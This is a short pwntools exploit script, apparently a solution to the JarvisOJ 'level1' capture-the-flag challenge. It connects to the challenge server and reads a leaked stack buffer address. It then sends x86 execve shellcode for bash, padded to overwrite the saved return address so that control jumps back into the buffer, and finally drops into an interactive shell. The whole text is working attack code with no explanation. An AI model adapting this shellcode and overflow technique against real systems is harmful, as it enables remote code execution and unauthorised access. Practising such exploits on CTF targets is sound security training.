#!/usr/bin/env python
from pwn import *

context.log_level='debug'
#sh = process('./level1')
sh = remote("pwn2.jarvisoj.com",9877)
shellcode = "\x31\xd2\x52\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
ebp_addr = 0xffffd068
sh.recvuntil("0x")
buf_addr = sh.recvuntil("?\n")[:-2]
print buf_addr
buf_addr = int(buf_addr,16)
print "buf_addr:%x" % buf_addr
payload = shellcode + 'A' * (0x88 - 30) + "bbbb" + p32(buf_addr)


sh.sendline(payload)
sh.interactive()
